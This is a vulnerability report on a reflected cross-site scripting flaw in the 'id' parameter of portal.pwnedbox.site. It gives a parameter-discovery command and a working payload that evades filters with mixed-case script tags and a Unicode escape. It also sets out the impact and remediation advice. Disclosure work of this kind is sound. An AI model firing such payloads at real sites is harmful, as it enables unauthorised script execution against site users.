## Title
Reflected XSS - portal.pwnedbox.site

## Description
The `portal.pwnedbox.site` endpoint was tested using the `x8scan` tool, which identified seven GET parameters. The `id` parameter was found vulnerable to Reflected Cross-Site Scripting (XSS) using a crafted JavaScript payload containing the Unicode escape sequence `\u0061`.

## Steps to Reproduce

1. Open a terminal and execute the following command to discover GET parameters:

   ```bash
   echo "https://portal.pwnedbox.site/" | x8scan -w params.txt
   ```

2. Observe the transformed GET URL generated by `x8scan`:

   ```text
   https://portal.pwnedbox.site/?cat=x8scan1&fname=x8scan2&id=x8scan3&lname=x8scan4&number=x8scan5&page=x8scan6&page.id=x8scan7
   ```

3. Identify the `id` parameter for testing.

4. Open the following crafted URL in a browser:

   ```text
   https://portal.pwnedbox.site/?id=hakama%27%22%3E%3CScRiPt%3E\u0061lert(1)%3C/ScRiPt%3E
   ```

5. Allow the page to load.

6. Observe the JavaScript alert dialog displaying `1`, confirming successful JavaScript execution.

7. Dismiss the alert dialog.

## POC (Proof of Concept)

**Target URL:**  
https://portal.pwnedbox.site/

**HTTP Method:** GET

**Tool Used:** x8scan

**Command Used:**
```bash
echo "https://portal.pwnedbox.site/" | x8scan -w params.txt
```

**Discovered Parameters:** `cat`, `fname`, `id`, `lname`, `number`, `page`, `page.id`

**Vulnerable Parameter:** `id`

**Payload:**
```html
hakama'"><ScRiPt>\u0061lert(1)</ScRiPt>
```

**Crafted Request URL:**
```text
https://portal.pwnedbox.site/?id=hakama%27%22%3E%3CScRiPt%3E\u0061lert(1)%3C/ScRiPt%3E
```

**Observed Result:**

The crafted JavaScript payload was successfully executed through the `id` parameter. The browser displayed an alert dialog containing `1`, confirming Reflected Cross-Site Scripting (XSS).

## Impact

- An attacker can craft a malicious URL and trick victims into opening it.
- Successful exploitation allows JavaScript execution in the victim's browser.
- The vulnerability may be abused for phishing or manipulation of displayed webpage content.

## Remediation

- Apply context-aware output encoding to the `id` parameter before rendering its value in HTML.
- Validate and sanitize user-controlled input to prevent HTML and JavaScript injection.
- Implement a restrictive Content Security Policy (CSP) to block unauthorized inline JavaScript execution.
